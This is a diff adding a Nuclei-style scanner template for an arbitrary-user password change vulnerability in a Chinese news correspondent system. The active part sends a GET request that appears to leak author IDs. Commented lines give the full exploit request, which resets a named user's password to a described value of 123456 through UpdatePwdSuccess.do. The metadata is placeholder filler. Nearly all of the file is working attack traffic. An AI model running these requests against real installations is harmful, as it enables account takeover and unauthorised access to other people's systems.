@@ -1,0 +1,46 @@
+id: qmt-getPublishTop-restpasswd
+info:
+  name: Template Name
+  author: apple
+  severity: high
+  description: 畅享通讯员系统任意用户密码修改漏洞,修改密码 :密码经过特殊方式加密，此POC，密码为123456.poc 请看本文件注释
+  reference:
+    - https://
+  tags: tags
+http:
+  - raw:
+      - |+
+        GET /newsedit/newsedit/batman/getPublishTop.do HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate, br
+        Connection: close
+        Upgrade-Insecure-Requests: 1
+
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - authorID
+      - type: word
+        part: body
+        words:
+          - author
+
+#POST /newsedit/newsedit/batman/UpdatePwdSuccess.do HTTP/1.1
+#Host: 127.0.0.1
+#User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0
+#Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+#Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+#Accept-Encoding: gzip, deflate, br
+#Content-Type: application/x-www-form-urlencoded
+#Content-Length: 568
+#Connection: close
+#Cookie: BMSearchType=1; JSESSIONID=235CA033F1BBC7845267FE2C0B493E09
+#Upgrade-Insecure-Requests: 1
+
+#userCode=seda&encrypttools=rsa&BM_PWD=613652a38e9861f3affb5b299b15ee174cda42ac0539605eca5677c04e68a46c47c1c350a16d19ac5b0244380aba1174167e2321cb32f97f8a10308be519de86072c4bbba980de9e2e56a9bdf91752fbafa73f5da10fbd4395c981f19c4030adad99eb71bcebae204040ac31680a63a9b2bfa26eb0f14545e16a13e82eb86d15&CHECK_PASSWORD=613652a38e9861f3affb5b299b15ee174cda42ac0539605eca5677c04e68a46c47c1c350a16d19ac5b0244380aba1174167e2321cb32f97f8a10308be519de86072c4bbba980de9e2e56a9bdf91752fbafa73f5da10fbd4395c981f19c4030adad99eb71bcebae204040ac31680a63a9b2bfa26eb0f14545e16a13e82eb86d15
